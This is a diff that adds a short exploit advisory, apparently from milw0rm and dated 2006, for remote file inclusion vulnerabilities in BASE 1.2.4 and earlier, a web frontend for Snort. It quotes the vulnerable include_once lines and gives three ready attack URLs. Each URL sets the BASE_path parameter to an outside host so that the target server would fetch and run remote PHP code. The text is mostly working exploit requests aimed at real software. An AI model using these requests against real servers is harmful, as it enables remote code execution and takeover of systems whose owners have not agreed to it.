@@ -1,0 +1,32 @@
+# Basic Analysis and Security Engine (BASE) <= 1.2.4 (melissa) Inclusion Vulnerabilities
+#   Just glanced over BASE for a pentesting job. /str0ke ! milw0rm.com
+##################################
+
+[code (base_qry_common.php)]
+   include_once("$BASE_path/includes/base_signature.inc.php");
+[/code]
+
+http://[site]/snort/base_qry_common.php?BASE_path=http://www.milw0rm.com/index.php?&
+
+########################################
+
+[code (base_stat_common.php)]
+   include_once("$BASE_path/includes/base_constants.inc.php");
+[/code]
+
+http://[site]/snort/base_stat_common.php?BASE_path=http://www.milw0rm.com/index.php?&
+
+###############################################
+
+[code (includes/base_include.inc.php)]
+   include_once("$BASE_path/includes/base_db.inc.php");
+   include_once("$BASE_path/includes/base_output_html.inc.php");
+   include_once("$BASE_path/includes/base_state_common.inc.php");
+   ...
+[/code]
+
+http://[site]/snort/includes/base_include.inc.php?BASE_path=http://www.milw0rm.com/index.php?&
+
+#######################################################
+
+# milw0rm.com [2006-05-25]
